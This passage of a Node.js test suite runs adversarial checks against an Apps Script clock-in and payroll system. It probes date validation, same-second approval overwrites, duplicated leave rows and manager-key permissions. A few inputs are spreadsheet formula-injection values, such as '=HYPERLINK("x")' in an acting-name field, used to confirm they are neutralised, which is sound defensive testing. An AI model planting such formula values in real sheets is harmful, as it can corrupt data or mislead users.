// 打卡系統其餘模組的對抗性驗證（2026-11-03，分支 adv/modules2）：拿 apps-script/*.gs 的真函式實跑
// 「會讓它算錯工時或薪資、讓沒權限的人看到或改到別人資料、讓核定被竄改、讓資料互相蓋掉」的輸入與時序。
// 範圍：manager.html 呼叫的 mgr_*（Code.gs）、舊連結打卡（handleClock／whoami／my_recent）、Sched.gs／SchedPub.gs、
//       Payroll.gs（payCollect／payCalcOne／出勤紀錄表／附件權限／特休／補休帳）、Mirror.gs、SvcStaff.gs。
// LINE 打卡那條路（Liff／LineHub／Requests）在 tests/adversarial-line.test.js，這裡不重複。
//
// 兩種項目（寫法同 adversarial-line.test.js）：
//   ok(name, fn)    ＝ 假設被推翻（程式擋住了），當迴歸守門；失敗會讓本檔非零結束。
//   KNOWN(name, fn) ＝ 已確認的問題，寫的是「應該要」的行為，目前會失敗。只印出、不擋 run-all；
//                     修好後它會變成 ✓，再把 KNOWN 改成 ok。設 ADV_STRICT=1 時 KNOWN 失敗也非零結束。
// 前端（manager.html／clock.html）的注入檢查在 tests/adversarial/front_modules.py（Playwright＋mock）。
// 名字一律用假名（測試一～）；不含任何金鑰、試算表 ID。
'use strict';
const assert = require('assert');
const fs = require('fs');
const vm = require('vm');
const path = require('path');
const crypto = require('crypto');
const ROOT = path.join(__dirname, '..');
const R = (f) => fs.readFileSync(path.join(ROOT, 'apps-script', f), 'utf8');
const SRC = { code: R('Code.gs'), pay: R('Payroll.gs'), liff: R('Liff.gs'), rest: R('Rest.gs'), req: R('Requests.gs'),
              mirror: R('Mirror.gs'), svc: R('SvcStaff.gs'), sched: R('Sched.gs'), schedpub: R('SchedPub.gs'), hub: R('LineHub.gs') };

let nOk = 0, nKnownOpen = 0, nKnownFixed = 0, failed = 0;
const ok = (name, fn) => { try { fn(); nOk++; console.log('✓ ' + name); } catch (e) { failed++; console.log('✗ ' + name + '\n    ' + String(e && e.stack || e).split('\n').slice(0, 2).join(' | ')); } };
const KNOWN = (name, fn) => {
  try { fn(); nKnownFixed++; console.log('✓ [KNOWN 已修好，可改成 ok] ' + name); }
  catch (e) { nKnownOpen++; console.log('✗ [KNOWN 待修] ' + name + '\n    ' + String(e.message || e).split('\n')[0]); }
};
// vm 裡建出來的陣列／物件跨 realm，deepStrictEqual 會判不等 → 一律過一次 JSON
const J = (x) => (x === undefined ? x : JSON.parse(JSON.stringify(x)));

/* ── 時間（台北，台灣沒有夏令時間）── */
const T = (s) => Date.parse(s + '+08:00');
const z = (v) => ('0' + v).slice(-2);
function taipei(ms) { const x = new Date(ms + 8 * 3600000); return { y: x.getUTCFullYear(), M: x.getUTCMonth() + 1, d: x.getUTCDate(), H: x.getUTCHours(), m: x.getUTCMinutes(), s: x.getUTCSeconds() }; }
function fmt(d, tz, p) {
  const t = taipei(d.getTime());
  return p.replace("yyyy-MM-dd'T'HH:mm:ssXXX", `${t.y}-${z(t.M)}-${z(t.d)}T${z(t.H)}:${z(t.m)}:${z(t.s)}+08:00`)
    .replace('yyyyMMdd-HHmmss', `${t.y}${z(t.M)}${z(t.d)}-${z(t.H)}${z(t.m)}${z(t.s)}`)
    .replace('yyyy-MM-dd', `${t.y}-${z(t.M)}-${z(t.d)}`).replace('yyyy-MM', `${t.y}-${z(t.M)}`)
    .replace('HH:mm', `${z(t.H)}:${z(t.m)}`).replace('M/d', `${t.M}/${t.d}`);
}
const iso = (ms) => fmt(new Date(ms), 'Asia/Taipei', "yyyy-MM-dd'T'HH:mm:ssXXX");

/* ── 表頭 ── */
const RH = ['emp_id', 'name', 'key', 'device_id', 'device_bound_at', 'active', 'shift_in', 'shift_out', 'created_at', 'created_by', 'removed_at', 'removed_by', 'line_user_id', 'line_bound_at'];
const EH = ['ts', 'emp_id', 'type', 'lat', 'lng', 'distance_m', 'within_range', 'device_id', 'device_match', 'status', 'accuracy_m'];
const MH = ['name', 'key', 'active', 'allow_acting', 'emp_id'];
const AH = ['date', 'emp_id', 'name', 'periods', 'approved_hours', 'status_text', 'manager_name', 'entered_at'];
const LH = ['日期', '姓名', '假別', '時數'];
const NH = ['id', 'text', 'active', 'ends_on', 'created_at', 'created_by'];
const toRow = (H, o) => (Array.isArray(o) ? o : H.map((h) => (o[h] === undefined ? '' : o[h])));
/** events 簡寫：[ms|ts, emp_id, type, status?, extra?] → 11 欄 */
const evRow = (e) => Array.isArray(e) && e.length <= 5
  ? [typeof e[0] === 'number' ? iso(e[0]) : e[0], e[1], e[2], 24.78, 121.01, 5, true, (e[4] && e[4].device_id) || 'D1', true, e[3] || 'ok', 10]
  : e;

/**
 * 沙盒：Code.gs＋Payroll.gs＋Liff.gs＋Rest.gs＋Requests.gs＋Mirror.gs＋SvcStaff.gs＋Sched.gs＋SchedPub.gs（＋LineHub.gs）整檔，
 * 與正式的光復專案同一個全域。可控時鐘（sb.__now）、CacheService（有 TTL）、指令碼屬性、鎖、假 LINE 驗證、假 Drive、假試算表。
 * opts.self：本店各分頁的列（物件或陣列）；opts.peers：{id: book}（別店／來源店）；opts.autoDate：模擬 Sheets 把 yyyy-MM-dd 自動轉成日期物件；
 * opts.pay：薪資分頁（master／store／config／holiday／leave_type／input／run／item／bonus）。
 */
function make(opts) {
  opts = opts || {};
  const props = Object.assign({}, opts.props || {});
  const cache = {};
  const sb = {
    console, String, Number, Math, JSON, Object, Array, RegExp, Error, TypeError, RangeError, isNaN, isFinite, parseFloat, parseInt,
    encodeURIComponent, decodeURIComponent, unescape, escape, Infinity, NaN,
    Logger: { log: () => {} }, __now: opts.now || T('2026-11-03T10:00:00'), __fetches: [], __triggers: [],
  };
  sb.Date = class extends Date { constructor(...a) { if (a.length) super(...a); else super(sb.__now); } static now() { return sb.__now; } };
  vm.createContext(sb);
  const VmDate = sb.Date;
  const autoDate = !!opts.autoDate;

  /* ── 假試算表（appendRow 加在最後；getRange 讀寫格子；deleteRow(s) 真的把列拿掉） ── */
  function sheet(values) {
    const v = values.map((r) => r.slice());
    const fmtMap = {};   // 'r,c' → '@'（鎖文字）；'col:c' → 整欄
    const isText = (r, c) => fmtMap[r + ',' + c] === '@' || fmtMap['col:' + c] === '@';
    const conv = (r, c, x) => (autoDate && r > 1 && typeof x === 'string' && /^\d{4}-\d{2}-\d{2}$/.test(x) && !isText(r, c)) ? new VmDate(x + 'T00:00:00+08:00') : x;
    const put = (r, c, x) => { while (v.length < r) v.push([]); const row = v[r - 1]; while (row.length < c) row.push(''); row[c - 1] = conv(r, c, x); };
    const sh = {
      values: v,
      getLastRow: () => v.length,
      getLastColumn: () => Math.max.apply(null, v.map((r) => r.length).concat([0])),
      getMaxRows: () => Math.max(v.length, 1),
      getMaxColumns: () => Math.max(sh.getLastColumn(), 26),
      setFrozenRows: () => {}, insertColumnAfter: () => {},
      getDataRange: () => ({ getValues: () => { const w = sh.getLastColumn(); return v.map((r) => { const c = r.slice(); while (c.length < w) c.push(''); return c; }); } }),
      getRange: (a, c, nr, nc) => {
        if (typeof a === 'string') {
          const m = /^([A-Z]+):([A-Z]+)$/.exec(a);
          const col = (s) => s.split('').reduce((n, ch) => n * 26 + ch.charCodeAt(0) - 64, 0);
          return { setNumberFormat: () => { if (m) for (let k = col(m[1]); k <= col(m[2]); k++) fmtMap['col:' + k] = '@'; return {}; }, getValues: () => [[]] };
        }
        const r = a; nr = nr || 1; nc = nc || 1;
        const api = {
          getValues: () => { const out = []; for (let i = 0; i < nr; i++) { const row = v[r - 1 + i] || []; const o = []; for (let j = 0; j < nc; j++) o.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]); out.push(o); } return out; },
          getValue: () => api.getValues()[0][0],
          setValue: (x) => { put(r, c, x); return api; },
          setValues: (xs) => { xs.forEach((row, i) => row.forEach((x, k) => put(r + i, c + k, x))); return api; },
          setNumberFormat: (f) => { for (let i = 0; i < nr; i++) for (let j = 0; j < nc; j++) fmtMap[(r + i) + ',' + (c + j)] = f; return api; },
          clearContent: () => { for (let i = 0; i < nr; i++) for (let j = 0; j < nc; j++) if (v[r - 1 + i]) v[r - 1 + i][c - 1 + j] = ''; return api; },
        };
        return api;
      },
      appendRow: (row) => { const r = v.length + 1; row.forEach((x, k) => put(r, k + 1, x)); },
      deleteRow: (n) => { v.splice(n - 1, 1); },
      deleteRows: (n, cnt) => { v.splice(n - 1, cnt); },
    };
    return sh;
  }
  function book(id, sheets) {
    const sh = {};
    Object.keys(sheets).forEach((k) => { if (sheets[k]) sh[k] = sheet(sheets[k]); });
    return { sh, getId: () => id, getSheetByName: (n) => sh[n] || null, insertSheet: (n) => { sh[n] = sheet([]); return sh[n]; }, getSheets: () => Object.keys(sh).map((k) => sh[k]) };
  }
  const s = opts.self || {};
  const selfSheets = {
    roster: [RH].concat((s.roster || []).map((o) => toRow(RH, o))),
    events: [EH].concat((s.events || []).map(evRow)),
    managers: [MH].concat((s.managers || [['值班主管', 'MK', 'true', '', '']]).map((o) => toRow(MH, o))),
    approved: [AH].concat((s.approved || []).map((o) => toRow(AH, o))),
    leave: [LH].concat((s.leave || []).map((o) => toRow(LH, o))),
    notices: s.notices === null ? null : [NH].concat((s.notices || []).map((o) => toRow(NH, o))),
  };
  Object.keys(s).forEach((k) => { if (!(k in selfSheets)) selfSheets[k] = s[k]; });   // 其他分頁（requests／sched_pub／payroll_*）直接給含表頭的二維陣列
  const self = book('SELF', selfSheets);
  const peers = opts.peers || {};
  sb.SpreadsheetApp = { openById: (id) => { if (id === 'SELF') return self; if (peers[id]) return peers[id]; throw new Error('沒權限或不存在：' + id); }, flush: () => {}, getActive: () => self };

  sb.CacheService = { getScriptCache: () => ({
    get: (k) => { const e = cache[k]; if (!e) return null; if (e.exp <= sb.__now) { delete cache[k]; return null; } return e.v; },
    put: (k, v, ttl) => { cache[k] = { v: String(v), exp: sb.__now + (ttl === undefined ? 600 : ttl) * 1000 }; },
    putAll: (m, ttl) => { Object.keys(m).forEach((k) => { cache[k] = { v: String(m[k]), exp: sb.__now + (ttl === undefined ? 600 : ttl) * 1000 }; }); },
    getAll: (ks) => { const o = {}; ks.forEach((k) => { const e = cache[k]; if (e && e.exp > sb.__now) o[k] = e.v; }); return o; },
    remove: (k) => { delete cache[k]; }, removeAll: (ks) => ks.forEach((k) => { delete cache[k]; }),
  }) };
  sb.PropertiesService = { getScriptProperties: () => ({ getProperty: (k) => (props[k] === undefined ? null : props[k]), setProperty: (k, v) => { props[k] = String(v); }, deleteProperty: (k) => { delete props[k]; }, getProperties: () => Object.assign({}, props) }) };
  const lock = { held: 0, tryLock: () => { if (sb.__lockBusy) return false; lock.held++; return true; }, waitLock: () => { if (sb.__lockBusy) throw new Error('timeout'); lock.held++; }, releaseLock: () => { lock.held = Math.max(0, lock.held - 1); }, hasLock: () => lock.held > 0 };
  sb.LockService = { getScriptLock: () => lock, getDocumentLock: () => lock };
  const signed = (b) => (b > 127 ? b - 256 : b);
  sb.Utilities = {
    formatDate: fmt, getUuid: () => crypto.randomUUID(), sleep: () => {},
    computeHmacSha256Signature: (v, k) => Array.from(crypto.createHmac('sha256', k).update(v).digest()).map(signed),
    computeDigest: (alg, v) => Array.from(crypto.createHash(alg === 'MD5' ? 'md5' : 'sha256').update(String(v)).digest()).map(signed),
    DigestAlgorithm: { SHA_256: 'SHA_256', MD5: 'MD5' }, Charset: { UTF_8: 'UTF_8' },
    base64Encode: (b) => Buffer.from(Array.isArray(b) ? b.map((x) => x & 255) : String(b)).toString('base64'),
    base64EncodeWebSafe: (b) => Buffer.from(Array.isArray(b) ? b.map((x) => x & 255) : String(b)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_'),
    base64Decode: (s) => Array.from(Buffer.from(s, 'base64')),
    newBlob: (bytes, mime, name) => ({ getContentType: () => mime, getBytes: () => bytes, name }),
  };
  const users = opts.lineUsers || { TOK_U1: { sub: 'U1' }, TOK_U2: { sub: 'U2' }, TOK_U3: { sub: 'U3' } };
  sb.UrlFetchApp = { fetch: (url, o) => {
    sb.__fetches.push({ url, o });
    if (opts.fetch) { const r = opts.fetch(url, o); if (r) return r; }
    const u = users[o && o.payload && o.payload.id_token];
    const body = u ? JSON.stringify({ sub: u.sub, aud: u.aud || '2011292256', exp: u.exp || Math.floor(sb.__now / 1000) + 3600 }) : '{"error":"invalid"}';
    return { getResponseCode: () => (u ? 200 : 400), getContentText: () => body };
  } };
  sb.ScriptApp = {
    getProjectTriggers: () => sb.__triggers.map((t) => ({ getHandlerFunction: () => t.fn, __t: t })),
    deleteTrigger: (h) => { sb.__triggers = sb.__triggers.filter((t) => t !== h.__t); },
    newTrigger: (fn) => { const spec = { fn }; const api = { timeBased: () => api, everyMinutes: (n) => { spec.every = n + 'min'; return api; }, everyDays: (n) => { spec.every = n + 'day'; return api; }, atHour: (h) => { spec.hour = h; return api; }, nearMinute: () => api, onMonthDay: (d) => { spec.day = d; return api; }, create: () => { sb.__triggers.push(spec); } }; return api; },
  };
  sb.ContentService = { MimeType: { JSON: 'json', TEXT: 'text' }, createTextOutput: (t) => ({ setMimeType: () => ({ __text: t }), getContent: () => t }) };
  const drive = opts.drive || {};   // { fileId: { parent: 'folderId', mime, bytes } }
  sb.DriveApp = {
    getFileById: (id) => { const f = drive[id]; if (!f) throw new Error('no file'); return { getId: () => id, getParents: () => { let i = 0; const ps = [f.parent]; return { hasNext: () => i < ps.length, next: () => ({ getId: () => ps[i++] }) }; }, getBlob: () => ({ getContentType: () => f.mime || 'image/png', getBytes: () => f.bytes || [1, 2, 3] }) }; },
    getFolderById: (id) => ({ getId: () => id, createFile: () => ({ getId: () => 'newfile' }) }),
    createFolder: () => ({ getId: () => 'newfolder' }),
  };

  const parts = [SRC.code, SRC.pay, SRC.liff, SRC.rest, SRC.req, SRC.mirror, SRC.svc, SRC.sched, SRC.schedpub];
  if (opts.hub) parts.push(SRC.hub);
  vm.runInContext(parts.join('\n'), sb);
  vm.runInContext("CONFIG.SPREADSHEET_ID = 'SELF'; CONFIG.ADMIN_KEY = 'ADM'; CONFIG.STORE_LAT = 24.78; CONFIG.STORE_LNG = 121.01; CONFIG.RADIUS_M = 20;", sb);
  // const 在 vm 的全域是語彙綁定、不會掛在 sb 上：要拿常數一律 vm.runInContext
  const C = (expr) => vm.runInContext(expr, sb);
  sb.__cfg = opts.config || {};
  C('Object.assign(CONFIG, __cfg)');
  // 薪資分頁：有給 seed 就建成含表頭的分頁（沒給的分頁由 paySheet 自己建）
  const pay = opts.pay || {};
  const PAY_SHEETS = J(C('PAY_SHEETS')), PAY_SHEET_NAME = J(C('PAY_SHEET_NAME'));
  Object.keys(pay).forEach((kind) => {
    const H = PAY_SHEETS[kind];
    self.sh[PAY_SHEET_NAME[kind]] = sheet([H].concat(pay[kind].map((o) => toRow(H, o))));
  });
  if (opts.rest_peers) sb.REST_PEERS_ = opts.rest_peers;
  // Payroll.gs 的 PAY_*_CACHE 是「同一次請求內」的快取；正式環境每個請求都是新的執行環境，
  // 這裡每個薪資入口被呼叫時先清掉，不然第二次呼叫會讀到上一次的舊表。
  const fresh = () => C('PAY_CLOCK_CACHE = {}; PAY_READ_CACHE = {}; PAY_SS_CACHE = {};');
  ['payCollect', 'payAnnualInfo', 'payCompMonthBook', 'payInputsBase', 'handlePayrollAttendanceExport', 'handlePayrollAttachGet', 'handlePayrollCalc',
   'handlePayrollLeaveOptions', 'handlePayrollAnnualLeft', 'handlePayrollCompCheck', 'handlePayrollInputs', 'handlePayrollMonth', 'handlePayrollFinalize']
    .forEach((f) => { const real = sb[f]; if (typeof real === 'function') sb[f] = function () { fresh(); return real.apply(this, arguments); }; });
  return { sb, self, props, cache, lock, C, fresh, setNow: (v) => { sb.__now = T(v); },
           rows: (name, bk) => { const sh = (bk || self).sh[name]; return sh ? sh.values.slice(1) : []; },
           objs: (name, bk) => { const sh = (bk || self).sh[name]; if (!sh) return []; const H = sh.values[0]; return sh.values.slice(1).map((r) => { const o = {}; H.forEach((h, i) => { o[h] = r[i]; }); return o; }); },
           events: () => self.sh.events.values.slice(1).map((r) => ({ ts: r[0], emp_id: r[1], type: r[2], status: r[9], device_id: r[7] })),
           book, sheet };
}
const ME = { emp_id: 'E01', name: '測試一', key: 'K1', device_id: 'D1', active: 'TRUE', line_user_id: 'U1' };
const U2 = { emp_id: 'E02', name: '測試二', key: 'K2', device_id: 'D2', active: 'TRUE', line_user_id: 'U2' };
const HERE = { lat: 24.78, lng: 121.01, accuracy: 5 };
const approve = (sb, b) => sb.handleMgrApprove(Object.assign({ mgr_key: 'MK', emp_id: 'E01' }, b));
const PERIOD = (a, b) => ({ start: a, end: b });

/* ════════════════════════════════════════════════════════════════════════════
 * 第一節：值班核定 handleMgrApprove／computeApprovalStatus／replaceLeaveRows／buildLatestApprovedMap
 * ════════════════════════════════════════════════════════════════════════════ */
console.log('━━ 第一節：值班核定（mgr_approve 一條龍）━━');

/* 1. 日期只驗 \d{4}-\d{2}-\d{2}，不驗真：V8 把 '2026-11-31' 當 12/1、'2026-02-30' 當 3/2。
   核定與請假列都用那個不存在的字串寫進表 → payCollect 用 slice(0,7) 歸到 11 月：事假 8 小時照扣錢、缺勤天數 +1 扣全勤。
   manager.html 的日期選擇器選不出這種日期，但營運系統／任何拿到主管金鑰的呼叫端可以直接送。 */
ok('核定日期要驗真：2026-11-31／2026-02-30 應回 bad_date（Requests.gs 的 reqIsDate_ 早就擋了，這裡沒擋）', () => {
  const m = make({ self: { roster: [ME] } });
  const r = approve(m.sb, { date: '2026-11-31', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 8 }] });
  assert.strictEqual(r.ok, false, '收下了：' + JSON.stringify(r));
  assert.strictEqual(r.error, 'bad_date');
});
ok('（修好後）2026-11-31 的核定＋事假 8 小時：直接 bad_date，核定與請假分頁都沒寫、11 月薪資不受影響', () => {
  const m = make({ self: { roster: [ME] } });
  const r = approve(m.sb, { date: '2026-11-31', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 8 }] });
  assert.strictEqual(r.error, 'bad_date', JSON.stringify(r));
  assert.ok(!m.rows('approved').some((x) => String(x[0]) === '2026-11-31'));
  const c = J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null));
  assert.ok(!c.E01 || !(c.E01.personal_h > 0), JSON.stringify(c.E01));
});
// 2026-11-04 夜間 QA：mgr_approve 不再收未來日期的上班時段，閏日改用已過去的 2024-02-29（原 2028-02-29 會回 future_date）
ok('（對照）閏日 2024-02-29 核定正常收、2026-13-01 擋（NaN 不會寫進表）', () => {
  const m = make({ self: { roster: [ME], events: [[T('2024-02-29T09:00:00'), 'E01', 'in'], [T('2024-02-29T18:00:00'), 'E01', 'out']] } });
  const r = approve(m.sb, { date: '2024-02-29', periods: [PERIOD('09:00', '18:00')] });
  assert.strictEqual(r.ok, true); assert.strictEqual(r.status_text, '正常'); assert.strictEqual(r.approved_hours, 9);
  const out = JSON.parse(m.sb.doPost({ postData: { contents: JSON.stringify({ action: 'mgr_approve', mgr_key: 'MK', emp_id: 'E01', date: '2026-13-01', periods: [PERIOD('09:00', '18:00')] }) } }).__text);
  assert.strictEqual(out.error, 'bad_date', JSON.stringify(out));   // 2026-11-04 修好：原本 addDaysStr 對 NaN 丟 RangeError → server_error
  assert.ok(!m.rows('approved').some((x) => String(x[0]) === '2026-13-01'), '寫進去了');
});

/* 2. 「同 (date,emp_id) 取 entered_at 最新」用嚴格大於：同一秒內的第二筆核定輸給第一筆。
   主管手機連按兩次「送出核定」或營運系統連送兩筆更正，兩筆在同一秒落地 → 後送的（更正）被忽略，薪資照第一筆算。 */
ok('同一秒內兩筆核定：後寫的那筆要算數（buildLatestApprovedMap 平手時應取較晚的列）', () => {
  const m = make({ now: T('2026-11-02T20:00:00'), self: { roster: [ME], events: [[T('2026-11-02T09:00:00'), 'E01', 'in'], [T('2026-11-02T12:00:00'), 'E01', 'out']] } });
  assert.ok(approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')] }).ok);          // 手滑填 18:00
  assert.ok(approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '12:00')] }).ok);          // 同一秒內更正成 12:00
  const day = m.sb.handleMgrDay({ mgr_key: 'MK', date: '2026-11-02' });
  assert.strictEqual(J(day).employees[0].approved.approved_hours, 3, '核定頁顯示的是第一筆：' + JSON.stringify(J(day).employees[0].approved));
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01.hours, 3, '薪資算的是第一筆');
});
ok('（對照）隔 1 秒的更正照常生效', () => {
  const m = make({ now: T('2026-11-02T20:00:00'), self: { roster: [ME] } });
  approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')] });
  m.sb.__now += 1000;
  approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '12:00')] });
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01.hours, 3);
});

/* 3. 時段 start === end：後端「end<=start 視為跨夜 +1 天」把 09:00–09:00 算成 24 小時。
   manager.html 會在確認框講「會算成跨夜到隔天（24 小時）」，營運系統直接呼叫就沒有這層。 */
ok('時段起訖相同（09:00–09:00）應擋 bad_periods，而不是核定 24 小時', () => {
  const m = make({ self: { roster: [ME] } });
  const r = approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '09:00')] });
  assert.strictEqual(r.ok, false, '核定了 ' + r.approved_hours + ' 小時');
});
ok('（對照）真跨夜 22:00–02:00 算 4 小時；10-31 跨到 11-01 的卡配得上、狀態正常、薪資歸 10 月', () => {
  const m = make({ now: T('2026-11-01T10:00:00'), self: { roster: [ME], events: [[T('2026-10-31T22:00:00'), 'E01', 'in'], [T('2026-11-01T02:00:00'), 'E01', 'out']] } });
  const r = approve(m.sb, { date: '2026-10-31', periods: [PERIOD('22:00', '02:00')] });
  assert.strictEqual(r.approved_hours, 4); assert.strictEqual(r.status_text, '正常');
  assert.strictEqual(J(m.sb.payCollect('2026-10', 6, 'SSLGF', [], null)).E01.hours, 4);
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01, undefined);
});

/* 4. 名冊姓名帶尾端空白（手動編輯、sync_roster 原樣寫入）：leaveRowsOf 用「trim 後的表 vs 未 trim 的名冊名」比對，永遠對不到
   → 核定頁看不到他的假、每次重送核定都多一列假 → payCollect 用 trim 對人，請假時數每核一次就翻倍。 */
ok('名冊姓名尾端有空白：重送核定要「取代」原本的請假列，不能越積越多', () => {
  const m = make({ self: { roster: [Object.assign({}, ME, { name: '測試一 ' })] } });
  approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 4 }] });
  approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 4 }] });
  const lv = m.rows('leave').filter((r) => String(r[0]) === '2026-11-02');
  assert.strictEqual(lv.length, 1, 'leave 分頁有 ' + lv.length + ' 列；payCollect 事假＝' + J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01.personal_h + 'H');
});
ok('（對照）姓名乾淨時重送核定會取代請假列；mgr_day 回得到假別', () => {
  const m = make({ self: { roster: [ME] } });
  approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 4 }] });
  approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 2 }, { type: '特休假', hours: 2 }] });
  assert.strictEqual(m.rows('leave').length, 2);
  assert.deepStrictEqual(J(m.sb.handleMgrDay({ mgr_key: 'MK', date: '2026-11-02' })).employees[0].leaves, [{ type: '事假', hours: 2 }, { type: '特休假', hours: 2 }]);
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01.personal_h, 2);
});

ok('遲到以分計、秒數不算：17:30:59 打卡配 17:30 班別＝正常，不會出現「遲到0分」去扣全勤', () => {
  const m = make({ now: T('2026-11-02T23:00:00'), self: { roster: [ME], events: [[T('2026-11-02T17:30:59'), 'E01', 'in'], [T('2026-11-02T22:00:00'), 'E01', 'out']] } });
  const r = approve(m.sb, { date: '2026-11-02', periods: [PERIOD('17:30', '22:00')] });
  assert.strictEqual(r.status_text, '正常');
  m.sb.__now += 1000;   // 同一秒內的第二筆會輸給第一筆（KNOWN #2），這裡隔 1 秒
  const r2 = approve(m.sb, { date: '2026-11-02', periods: [PERIOD('17:29', '22:00')] });
  assert.strictEqual(r2.status_text, '遲到1分');
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01.deduct_days, 1);
});
ok('遲到分鐘欄：留空＝系統判；0＝「主管認定不計遲到」且薪資不算缺勤；" 7 "＝遲到7分(認定)流進薪資；-3／"5abc"／Infinity 一律忽略', () => {
  const m = make({ now: T('2026-11-02T23:00:00'), self: { roster: [ME], events: [[T('2026-11-02T17:40:00'), 'E01', 'in'], [T('2026-11-02T22:00:00'), 'E01', 'out']] } });
  const st = (late) => { m.sb.__now += 1000; return approve(m.sb, { date: '2026-11-02', periods: [PERIOD('17:30', '22:00')], late_min: late }).status_text; };
  assert.strictEqual(st(''), '遲到10分');
  assert.strictEqual(st('0'), '主管認定不計遲到');
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01.deduct_days, 0);
  assert.strictEqual(st(' 7 '), '遲到7分(認定)');
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01.late_min, 7);
  assert.strictEqual(st('-3'), '遲到10分'); assert.strictEqual(st('5abc'), '遲到10分'); assert.strictEqual(st('Infinity'), '遲到10分');
});
ok('系統重算（recheck）不會洗掉主管認定；沒打卡的日子補卡後狀態會被補一筆修正', () => {
  const m = make({ now: T('2026-11-02T23:00:00'), self: { roster: [ME] } });
  approve(m.sb, { date: '2026-11-02', periods: [PERIOD('17:30', '22:00')], late_min: '5' });
  const r2 = approve(m.sb, { date: '2026-11-01', periods: [PERIOD('17:30', '22:00')] });
  assert.strictEqual(r2.status_text, '該段無打卡');
  m.self.sh.events.appendRow(evRow([T('2026-11-01T17:30:00'), 'E01', 'in'])); m.self.sh.events.appendRow(evRow([T('2026-11-01T22:00:00'), 'E01', 'out']));
  m.setNow('2026-11-04T05:00:00');
  const rc = J(m.sb.recheckPendingApprovalStatuses());
  assert.deepStrictEqual(rc, { checked: 2, fixed: 1 });   // 11-02 帶「(認定)」整筆跳過
  const map = J(m.sb.buildLatestApprovedMap(m.objs('approved')));
  assert.strictEqual(map['2026-11-01'].E01.status_text, '正常');
  assert.strictEqual(map['2026-11-01'].E01.manager_name, '值班主管（系統重算）');
  assert.strictEqual(map['2026-11-02'].E01.status_text, '該段無打卡、遲到5分(認定)');
});
ok('出差：有時段＋出差 2 小時＝時段＋2；整天出差沒填時數擋 trip_needs_hours；整天請假沒假別擋', () => {
  const m = make({ self: { roster: [ME] } });
  assert.strictEqual(approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '13:00')], leaves: [{ type: '出差', hours: 2 }] }).approved_hours, 6);
  assert.strictEqual(approve(m.sb, { date: '2026-11-02', periods: [], leaves: [{ type: '出差', hours: '' }] }).error, 'trip_needs_hours');
  assert.strictEqual(approve(m.sb, { date: '2026-11-02', periods: [], leaves: [] }).error, 'bad_periods');
  assert.strictEqual(approve(m.sb, { date: '2026-11-02', periods: [], leaves: [{ type: '事假', hours: 8 }] }).status_text, '全天請假');
});
ok('假別清單：同假別兩次擋、5 種擋、不在白名單且薪資表查不到擋、時數負的擋、舊呼叫端改多假別日擋', () => {
  const m = make({ self: { roster: [ME] } });
  const base = { date: '2026-11-02', periods: [PERIOD('09:00', '13:00')] };
  assert.strictEqual(approve(m.sb, Object.assign({}, base, { leaves: [{ type: '事假', hours: 1 }, { type: '事假', hours: 1 }] })).error, 'dup_leave_type');
  assert.strictEqual(approve(m.sb, Object.assign({}, base, { leaves: ['事假', '病假', '特休假', '出差', '生理假'].map((t) => ({ type: t, hours: 1 })) })).error, 'too_many_leaves');
  assert.strictEqual(approve(m.sb, Object.assign({}, base, { leaves: [{ type: '=1+1', hours: 1 }] })).error, 'bad_leave_type');
  assert.strictEqual(approve(m.sb, Object.assign({}, base, { leaves: [{ type: '事假', hours: -1 }] })).error, 'bad_leave_hours');
  assert.ok(approve(m.sb, Object.assign({}, base, { leaves: [{ type: '事假', hours: 1 }, { type: '病假', hours: 1 }] })).ok);
  assert.strictEqual(approve(m.sb, Object.assign({}, base, { leave_type: '事假', leave_hours: 2 })).error, 'multi_leave_day');
});
ok('核定人：一般主管鑰匙送 acting_name 一律忽略（寫主管本名）；allow_acting 列才採用，且 = 開頭換全形、41 字拒絕', () => {
  const m = make({ self: { roster: [ME], managers: [['值班主管', 'MK', 'true', '', ''], ['營運系統', 'SVC', 'true', 'TRUE', '']] } });
  assert.strictEqual(approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '13:00')], acting_name: '冒名' }).manager_name, '值班主管');
  assert.strictEqual(approve(m.sb, { mgr_key: 'SVC', date: '2026-11-02', periods: [PERIOD('09:00', '13:00')], acting_name: '=HYPERLINK("x")' }).manager_name, '＝HYPERLINK("x")');
  assert.strictEqual(approve(m.sb, { mgr_key: 'SVC', date: '2026-11-02', periods: [PERIOD('09:00', '13:00')], acting_name: 'x'.repeat(41) }).error, 'bad_acting_name');
  assert.strictEqual(approve(m.sb, { mgr_key: 'SVC', date: '2026-11-02', periods: [PERIOD('09:00', '13:00')], acting_name: '' }).manager_name, '營運系統');
});
ok('停用的主管鑰匙什麼都做不了（核定／當日清單／異動／公告／裝置）', () => {
  const m = make({ self: { roster: [ME], managers: [['離職主管', 'OLD', 'false', '', '']] } });
  const sb = m.sb;
